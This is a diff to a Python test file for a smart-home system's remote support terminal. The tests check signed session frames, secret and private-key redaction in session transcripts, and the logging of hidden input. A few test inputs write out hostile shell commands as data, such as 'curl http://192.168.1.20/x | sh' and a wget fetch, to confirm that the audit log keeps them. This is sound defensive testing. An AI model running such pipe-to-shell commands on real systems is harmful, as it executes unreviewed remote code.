@@ -127,7 +127,7 @@ def test_redaction() -> None:
     assert "abc123" not in r('api_key: "abc123"\n')
     assert "xyz" not in r("export MY_TOKEN=xyz\n")
     tok = "A" * 40
-    assert tok not in r(f'"pairing_token": "{tok}"')
+    assert tok not in r(f'"pairing_token": "{tok}"\n')
     assert r("ls -la\r\n") == "ls -la\r\n"
     # A private key split over frames is blanked whole.
     first = r("x\n-----BEGIN OPENSSH PRIVATE KEY-----\nAAAAsecret1\n")
@@ -150,10 +150,12 @@ def test_the_transcript_is_asciicast_hides_hidden_input_and_caps(tmp_path, monke
     header = json.loads(lines[0])
     assert header["version"] == 2 and header["width"] == 80 and header["height"] == 24
     events = [json.loads(x) for x in lines[1:]]
-    assert [e[1] for e in events] == ["i", "o", "i", "o"]
-    assert events[2][2] == ss.HIDDEN_INPUT                 # once, for the run
+    assert [e[1] for e in events] == ["i", "o", "i", "i", "o"]
+    assert events[2][2] == "[hidden input: 12 bytes]"      # a count, never the bytes
+    # Echo off past the first line is no longer a password prompt: logged.
+    assert events[3][2] == "more\r"
     whole = "\n".join(lines)
-    assert "my-password" not in whole and "more" not in whole
+    assert "my-password" not in whole
     assert "setup-code-words" not in whole
     if os.name == "posix":
         assert (tmp_path / ("c" * 32 + ".cast")).stat().st_mode & 0o777 == 0o600
@@ -204,6 +206,7 @@ class FakeSat:
         self.said: list[str] = []
         self.closed: list[int] = []
         self.abilities = satellite_abilities.from_hello(hello or {"support_shell": True})
+        self.support_nonce = "ab" * 16
         self.board = None
         self.dropin_peer = None
         self.wake_recording = None
@@ -281,8 +284,9 @@ async def open_one(w, *, answer: str | None = None):
     browser = FakeBrowser()
     task = asyncio.create_task(w.mgr.run(browser, sess))
     await until(lambda: "support_open" in w.sat.kinds())
-    opening = w.sat.frames[-1]
+    opening = w.sat.frames[-1]["signed"]["doc"]
     assert opening["max_sec"] == ss.MAX_SEC and opening["idle_sec"] == ss.IDLE_SEC
+    assert opening["satellite_id"] == SAT and opening["nonce"] == w.sat.support_nonce
     if answer is None:
         await w.mgr.satellite_frame(w.sat, {"type": "support_opened", "session_id": sess.id})
         await until(lambda: sess.state == "open")
@@ -302,10 +306,10 @@ async def test_a_session_opens_relays_logs_and_ends(world) -> None:
     w = world
     sess, browser, task = await open_one(w)
     await until(lambda: w.sat.said == [ss.START_LINE])         # owner answer 2
-    assert browser.of("opened")
+    await until(lambda: browser.of("opened"))
     await browser.inbox.put(json.dumps({"t": "in", "d": b64(b"uptime\r")}))
     await until(lambda: "support_input" in w.sat.kinds())
-    assert base64.b64decode(w.sat.frames[-1]["data"]) == b"uptime\r"
+    assert base64.b64decode(w.sat.frames[-1]["signed"]["doc"]["data"]) == b"uptime\r"
     await w.mgr.satellite_frame(w.sat, {"type": "support_output", "session_id": sess.id,
                                         "seq": 1, "data": b64(b" 10:00 up 3 days\r\n")})
     await until(lambda: browser.of("out"))
@@ -400,10 +404,10 @@ async def test_hidden_input_while_echo_is_off(world) -> None:
     sess, browser, task = await open_one(w)
     await w.mgr.satellite_frame(w.sat, {"type": "support_echo", "session_id": sess.id, "on": False})
     await w.mgr.browser_message(sess, json.dumps({"t": "in", "d": b64(b"hunter2\r")}))
-    assert base64.b64decode(w.sat.frames[-1]["data"]) == b"hunter2\r"     # still typed
+    assert base64.b64decode(w.sat.frames[-1]["signed"]["doc"]["data"]) == b"hunter2\r"  # still typed
     await w.mgr.end_by_id(sess.id, "admin_ended")
     cast = ss.read_transcript(sess.id)
-    assert "hunter2" not in cast and ss.HIDDEN_INPUT in cast
+    assert "hunter2" not in cast and "[hidden input: 8 bytes]" in cast
 
 
 @requires_db
@@ -644,7 +648,10 @@ async def test_opening_needs_freshness_and_the_password_again(house) -> None:
     assert r.status_code == 200, r.text
     body = r.json()
     assert len(body["ticket"]) == 64 and body["ticket_ttl_sec"] == 30 and body["max_sec"] == 1800
-    assert house.sat.frames == []                        # nothing until the socket attaches
+    # Only the signed switch (sent when it was turned on); no open until
+    # the socket attaches.
+    assert [f["type"] for f in house.sat.frames] == ["support_allow"]
+    assert house.sat.frames[0]["signed"]["doc"]["allowed"] is True
     r = await core_post(OPEN, house.token, json={"password": STRONG_PW})
     assert r.status_code == 409                          # one per satellite
 
@@ -857,3 +864,293 @@ async def test_a_satellite_whose_id_is_not_its_rooms(_db, tmp_path, monkeypatch)
         reg.note("supportroom-speaker", None)
         await sql("DELETE FROM support_sessions")
         await sql("DELETE FROM satellites WHERE satellite_id = :s", s=SAT2)
+
+
+# ═══ The 2026-11-23 security round ═══════════════════════════════════════
+
+
+def _verify(frame: dict, kind: str, sat_id: str = SAT, nonce: str = "ab" * 16) -> dict:
+    """The satellite's own check (satellite/server_identity.verify_support)
+    against this core's key: what the core signs is what the device takes."""
+    from domovoi import server_identity
+    from satellite import server_identity as sat_identity
+
+    fp = server_identity.load_or_create().fingerprint
+    return sat_identity.verify_support(frame["signed"], kind=kind, expected_fingerprint=fp,
+                                       satellite_id=sat_id, nonce=nonce, now=time.time())
+
+
+def test_support_signatures_have_their_own_context() -> None:
+    """H3: a support signature can never pass as a health answer or a
+    manifest signature, nor one of those as a support frame."""
+    from domovoi import server_identity
+    from satellite import server_identity as sat_identity
+
+    assert server_identity.SUPPORT_CONTEXT == b"domovoi-support-v1"
+    others = {server_identity.HEALTH_CONTEXT, server_identity.MANIFEST_CONTEXT,
+              server_identity.MANIFEST_CONTEXT_V2}
+    assert server_identity.SUPPORT_CONTEXT not in others
+    assert sat_identity.SUPPORT_CONTEXT == server_identity.SUPPORT_CONTEXT
+    doc = {"kind": "support_open", "satellite_id": SAT}
+    assert server_identity.support_message(doc) == sat_identity.support_message(doc)
+
+
+@requires_db
+async def test_the_open_and_each_input_are_signed_for_this_satellite_and_connection(world) -> None:
+    """H3 on the core's side: the open and every input carry the identity
+    signature over the satellite id and this connection's nonce, and the
+    satellite's own check accepts them; input numbers only go up."""
+    from satellite import server_identity as sat_identity
+
+    w = world
+    sess, browser, task = await open_one(w)
+    opening = next(f for f in w.sat.frames if f["type"] == "support_open")
+    assert set(opening) == {"type", "session_id", "signed"}     # nothing outside the signature
+    doc = _verify(opening, "support_open")
+    assert doc["session_id"] == sess.id and doc["max_sec"] == ss.MAX_SEC
+    with pytest.raises(sat_identity.IdentityError):
+        _verify(opening, "support_open", sat_id="bedroom")       # another satellite
+    with pytest.raises(sat_identity.IdentityError):
+        _verify(opening, "support_open", nonce="cd" * 16)        # another connection
+    with pytest.raises(sat_identity.IdentityError):
+        _verify(opening, "support_input")                         # another kind
+    for word in (b"ls\r", b"pwd\r"):
+        await w.mgr.browser_message(sess, json.dumps({"t": "in", "d": b64(word), "k": True}))
+    inputs = [_verify(f, "support_input") for f in w.sat.frames if f["type"] == "support_input"]
+    assert [d["seq"] for d in inputs] == [1, 2] and all(d["active"] for d in inputs)
+    assert [base64.b64decode(d["data"]) for d in inputs] == [b"ls\r", b"pwd\r"]
+
+
+@requires_db
+async def test_a_connection_without_a_nonce_is_never_sent_an_open(world) -> None:
+    w = world
+    w.sat.support_nonce = None
+    sess, ticket = await w.mgr.create(satellite_id=SAT, room_id="kitchen", admin_hash=w.hash,
+                                      cols=80, rows=24)
+    await asyncio.wait_for(w.mgr.run(FakeBrowser(), sess), 3)
+    assert "support_open" not in w.sat.kinds()
+    assert (await row(sess.id)).end_reason == "not_signed"
+
+
+@requires_db
+async def test_the_allow_state_is_sent_signed(world) -> None:
+    w = world
+    assert await ss.send_allow_state(w.app, w.sat, True)
+    assert _verify(w.sat.frames[-1], "support_allow")["allowed"] is True
+    assert await ss.send_allow_state(w.app, w.sat, False)
+    assert _verify(w.sat.frames[-1], "support_allow")["allowed"] is False
+
+
+@requires_db
+async def test_terminal_answers_dont_count_as_activity(world) -> None:
+    """L29: only key presses and pastes (`k`) keep a session from idling."""
+    w = world
+    sess, browser, task = await open_one(w)
+    start = sess.last_input
+    await asyncio.sleep(0.01)
+    await w.mgr.browser_message(sess, json.dumps({"t": "in", "d": b64(b"\x1b[1;1R")}))
+    assert sess.last_input == start
+    signed = [f for f in w.sat.frames if f["type"] == "support_input"][-1]["signed"]["doc"]
+    assert signed["active"] is False
+    await w.mgr.browser_message(sess, json.dumps({"t": "in", "d": b64(b"a"), "k": True}))
+    assert sess.last_input > start
+
+
+def _cast_events(sid: str) -> list:
+    return [json.loads(x) for x in ss.read_transcript(sid).splitlines()[1:]]
+
+
+def test_a_private_key_marker_cannot_stop_the_transcript(tmp_path, monkeypatch) -> None:
+    """M2: `echo '-----BEGIN PRIVATE KEY-----'` used to blank everything
+    after it, with no marker, and the cap never tripped."""
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("e" * 32, cols=80, rows=24, title="t")
+    t.output(b"$ echo '-----BEGIN PRIVATE KEY-----'\r\n-----BEGIN PRIVATE KEY-----\r\n")
+    before = t.bytes
+    for i in range(2000):
+        t.output(f"line {i} of what the shell did next\r\n".encode())
+    t.close()
+    cast = ss.read_transcript("e" * 32)
+    assert ss.KEY_REMOVED in cast
+    assert "logging resumed" in cast
+    assert "line 1999 of what the shell did next" in cast
+    assert t.bytes > before + 2000 * 20
+
+
+def test_blanked_bytes_count_against_the_cap(tmp_path, monkeypatch) -> None:
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    monkeypatch.setattr(ss, "TRANSCRIPT_MAX_BYTES", 64 * 1024)
+    monkeypatch.setattr(ss, "PEM_MAX", 10 ** 9)            # a key that never ends
+    t = ss.Transcript("f" * 32, cols=80, rows=24, title="t")
+    t.output(b"-----BEGIN RSA PRIVATE KEY-----\n")
+    with pytest.raises(ss.LogFull):
+        for _ in range(1000):
+            t.output(b"A" * 1000 + b"\n")
+    assert t.truncated
+
+
+def test_a_key_split_across_frames_and_its_end_line_split_too(tmp_path, monkeypatch) -> None:
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("1" * 32, cols=80, rows=24, title="t")
+    for piece in (b"-----BEGIN OPENSSH PRIV", b"ATE KEY-----\nsecretbody1\nsecretbody2\n-----END OP",
+                  b"ENSSH PRIVATE KEY-----\nafter the key\n"):
+        t.output(piece)
+    t.close()
+    cast = ss.read_transcript("1" * 32)
+    assert "secretbody" not in cast and ss.KEY_REMOVED in cast and "after the key" in cast
+
+
+def test_pasting_the_marker_as_input_does_not_hide_later_input(tmp_path, monkeypatch) -> None:
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("2" * 32, cols=80, rows=24, title="t")
+    t.input(b"-----BEGIN PRIVATE KEY-----\r", echo_on=True)
+    t.input(b"curl http://192.168.1.20/x | sh\r", echo_on=True)
+    t.close()
+    cast = ss.read_transcript("2" * 32)
+    assert "curl http://192.168.1.20/x | sh" in cast
+
+
+def test_echo_off_cannot_hide_a_whole_session(tmp_path, monkeypatch) -> None:
+    """M2: `stty -echo` then typing: each hidden frame is a count, and past
+    the first line the input is logged as typed."""
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("3" * 32, cols=80, rows=24, title="t")
+    t.input(b"pw\r", echo_on=False)
+    t.input(b"wget http://192.168.1.20/a\r", echo_on=False)
+    t.input(b"x", echo_on=False)
+    t.close()
+    values = [e[2] for e in _cast_events("3" * 32)]
+    assert values[0] == "[hidden input: 3 bytes]"
+    assert "wget http://192.168.1.20/a\r" in values
+
+
+def test_secrets_typed_a_key_at_a_time_or_split_are_caught(tmp_path, monkeypatch) -> None:
+    """L26: redaction works over whole lines, with escape codes out."""
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("4" * 32, cols=80, rows=24, title="t")
+    for ch in b"export API_TOKEN=hunter22\r":
+        t.input(bytes([ch]), echo_on=True)
+    t.output(b"psk=supers")
+    t.output(b"ecret99\r\n")
+    t.output(b"\x1b[01;31m\x1b[Kpassword\x1b[m\x1b[K = c0l0ured\r\n")
+    t.close()
+    cast = ss.read_transcript("4" * 32)
+    assert "hunter22" not in cast
+    assert "supersecret99" not in cast and "ecret99" not in cast
+    assert "c0l0ured" not in cast
+
+
+def test_the_transcript_redactor_is_linear(tmp_path, monkeypatch) -> None:
+    """M5's sibling: the old assignment rule took about a second per 16 KB
+    frame on the event loop."""
+    monkeypatch.setattr(ss, "transcript_dir", lambda: tmp_path)
+    t = ss.Transcript("5" * 32, cols=80, rows=24, title="t")
+    started = time.monotonic()
+    for frame in (b"key" * 5000, b"a.b-" * 4000 + b"\n", b"export " * 2000 + b"\n"):
+        t.output(frame)
+    t.close()
+    assert time.monotonic() - started < 1.0
+
+
+@requires_db
+async def test_deleting_an_open_sessions_id_keeps_its_transcript(world) -> None:
+    """L30."""
+    w = world
+    sess, browser, task = await open_one(w)
+    path = ss.transcript_path(sess.id)
+    assert path.exists()
+    assert not await ss.delete_session(sess.id)
+    assert path.exists()
+
+
+@requires_db
+async def test_the_close_is_recorded_before_the_satellite_is_told(world) -> None:
+    """L31: a send that hangs can't keep the session looking open."""
+    w = world
+    sess, browser, task = await open_one(w)
+    gate = asyncio.Event()
+    real = w.sat.send_support
+
+    async def stuck(frame):
+        if frame["type"] == "support_close":
+            await gate.wait()
+        await real(frame)
+
+    w.sat.send_support = stuck
+    ender = asyncio.create_task(w.mgr.end(sess, "admin_ended"))
+    await until(lambda: sess.state == "ended")
+    deadline = time.monotonic() + 3
+    while (await row(sess.id)).closed_at is None:
+        assert time.monotonic() < deadline
+        await asyncio.sleep(0.02)
+    gate.set()
+    await asyncio.wait_for(ender, 6)
+
+
+def test_removing_a_satellite_ends_its_session() -> None:
+    import inspect
+
+    from domovoi import main as core_main
+
+    src = inspect.getsource(core_main.admin_delete_satellite)
+    assert 'end_for_satellite(room_id, "removed")' in src
+
+
+@requires_db
+async def test_no_drop_in_while_a_session_is_open(world) -> None:
+    """L28: the call's red light would hide the session's magenta one."""
+    import inspect
+
+    from domovoi.streaming import StreamSession
+
+    w = world
+    sess, browser, task = await open_one(w)
+    other = FakeSat("bedroom")
+    assert w.mgr.open_on(w.sat, other) and w.mgr.open_on(other, w.sat)
+    assert not w.mgr.open_on(other)
+    assert "open_on(self, peer)" in inspect.getsource(StreamSession._begin_dropin)
+
+
+class _TermWS:
+    def __init__(self, app, headers: dict) -> None:
+        self.app = app
+        self.headers = headers
+        self.closed: list[int] = []
+        self.accepted = False
+
+    async def close(self, code: int = 1000) -> None:
+        self.closed.append(code)
+
+    async def accept(self, subprotocol=None) -> None:
+        self.accepted = True
+
+
+@requires_db
+async def test_a_sniffed_ticket_without_the_openers_bearer_is_refused(world) -> None:
+    """L27: the core's terminal socket needs the opener's Bearer too."""
+    from domovoi import support_routes
+
+    w = world
+    w.app.state.support_sessions = w.mgr
+    sess, ticket = await w.mgr.create(satellite_id=SAT, room_id="kitchen", admin_hash=w.hash,
+                                      cols=80, rows=24)
+    ws = _TermWS(w.app, {support_routes.TICKET_HEADER: ticket})
+    await support_routes.support_terminal(ws, sess.id)
+    assert ws.closed == [1008] and not ws.accepted
+    assert sess.state == "ended"
+    sess, ticket = await w.mgr.create(satellite_id=SAT, room_id="kitchen", admin_hash=w.hash,
+                                      cols=80, rows=24)
+    ws = _TermWS(w.app, {support_routes.TICKET_HEADER: ticket,
+                         "authorization": "Bearer " + "0" * 64})
+    await support_routes.support_terminal(ws, sess.id)
+    assert ws.closed == [1008] and not ws.accepted
+
+
+def test_the_dashboard_relay_forwards_the_bearer_and_draws_no_links() -> None:
+    relay = (REPO / "web" / "backend" / "api" / "support_sessions.py").read_text(encoding="utf-8")
+    assert '"Authorization": f"Bearer {bearer}"' in relay
+    assert "if ticket is None or bearer is None" in relay
+    jsx = (REPO / "web" / "static" / "support_session.jsx").read_text(encoding="utf-8")
+    assert "`bearer.${bearer}`" in jsx
+    assert "linkHandler = { activate: () => {}" in jsx            # L32
+    assert "term.onKey(" in jsx and ", k });" in jsx                # L29
